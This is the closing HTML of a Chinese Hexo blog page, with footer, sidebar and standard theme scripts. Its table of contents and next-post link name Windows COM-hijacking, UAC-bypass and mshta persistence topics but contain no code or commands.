+    <a href="/2021/12/25/%E9%80%9A%E8%BF%87%E7%99%BD%E5%90%8D%E5%8D%95%E7%A8%8B%E5%BA%8Fmshta%E6%89%A7%E8%A1%8Chta%E6%96%87%E4%BB%B6%E6%9D%A5%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%8A%A8%E9%87%8D%E5%90%AF%E4%BB%BB%E5%8A%A1/" rel="next" title="通过白名单程序mshta执行hta文件来设置自动重启任务">
+      通过白名单程序mshta执行hta文件来设置自动重启任务 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E9%80%9A%E8%BF%87CLR%E5%8A%AB%E6%8C%81Terminal"><span class="nav-number">1.</span> <span class="nav-text">0x01 通过CLR劫持Terminal</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E9%80%9A%E8%BF%87CAccPropServicesClass%E5%8A%AB%E6%8C%81IE"><span class="nav-number">2.</span> <span class="nav-text">0x02 通过CAccPropServicesClass劫持IE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E9%80%9A%E8%BF%87MruPidlList%E5%8A%AB%E6%8C%81explorer-exe"><span class="nav-number">3.</span> <span class="nav-text">0x03 通过MruPidlList劫持explorer.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E9%80%9A%E8%BF%87TreatAS%E5%AD%90%E9%94%AE%E5%8A%AB%E6%8C%81%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%99%A8"><span class="nav-number">4.</span> <span class="nav-text">0x04 通过TreatAS子键劫持家庭网络配置管理器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Bypass-UAC"><span class="nav-number">5.</span> <span class="nav-text">0x05 Bypass UAC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84%EF%BC%9A%E9%80%9A%E7%94%A8%E7%9A%84%E5%8A%AB%E6%8C%81%E8%84%9A%E6%9C%AC"><span class="nav-number">6.</span> <span class="nav-text">附：通用的劫持脚本</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Bu1</p>
+  <div class="site-description" itemprop="description">最为惊艳的是思想碰撞产生的火花。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
